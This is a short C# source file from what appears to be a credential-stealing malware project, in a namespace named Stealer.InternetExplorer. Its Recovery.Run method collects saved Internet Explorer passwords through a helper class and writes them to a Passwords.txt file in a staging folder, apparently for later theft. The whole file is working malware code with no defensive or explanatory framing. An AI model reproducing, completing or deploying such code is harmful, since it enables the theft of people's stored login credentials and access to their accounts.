using System.Collections.Generic;
using System.IO;

namespace Stealer.InternetExplorer;

internal sealed class Recovery
{
	public static void Run(string sSavePath)
	{
		List<Password> list = cPasswords.Get();
		if (list.Count != 0)
		{
			Directory.CreateDirectory(sSavePath + "\\InternetExplorer");
			cBrowserUtils.WritePasswords(list, sSavePath + "\\InternetExplorer\\Passwords.txt", "Internet Explorer");
		}
	}
}
